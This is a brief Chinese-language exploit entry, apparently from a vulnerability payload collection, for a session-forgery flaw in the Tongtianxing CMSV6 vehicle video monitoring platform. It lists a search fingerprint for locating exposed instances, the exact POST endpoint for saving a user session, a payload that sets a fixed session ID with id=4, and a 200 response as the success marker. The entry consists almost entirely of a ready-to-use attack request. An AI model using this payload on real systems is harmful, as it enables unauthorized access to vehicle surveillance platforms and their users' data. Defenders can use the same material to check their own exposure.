# 通天星CMSV6车载视频监控平台SESSION伪造漏洞

通天星CMSV6车载视频监控平台SESSION伪造 ｜ 其他 ｜ —
- **指纹**：`body="/808gps/"`
- **请求**：`POST /808gps/LocationManagement/UserSessionAction_saveUserSession.action HTTP/1.1`

**Payload**
```
userSession=42AA7A2BE767123A42E1530ACC920781&amp;amp;id=4
```
- **响应特征**：200